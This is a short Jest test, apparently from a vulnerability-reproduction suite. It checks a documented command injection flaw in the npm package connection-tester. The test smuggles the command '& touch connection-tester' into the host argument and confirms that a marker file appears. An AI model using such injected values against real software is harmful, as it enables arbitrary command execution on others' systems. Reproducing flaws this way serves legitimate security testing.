//https://snyk.io/vuln/SNYK-JS-CONNECTIONTESTER-1048337
test("Command Injection in connection-tester", () => {
  expect.assertions(2);
  const a = require("connection-tester");
  const fs = require("fs");
  const path = "./connection-tester";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      // console.log('File removed:', path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.test("& touch connection-tester", 123, 1000);
  } catch (error) {
    // console.log('error');
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlinkSync(path);
  fs.unlinkSync("1000");
  fs.unlinkSync("123");
  // fs.unlink(path, function (err) {
  // });
});
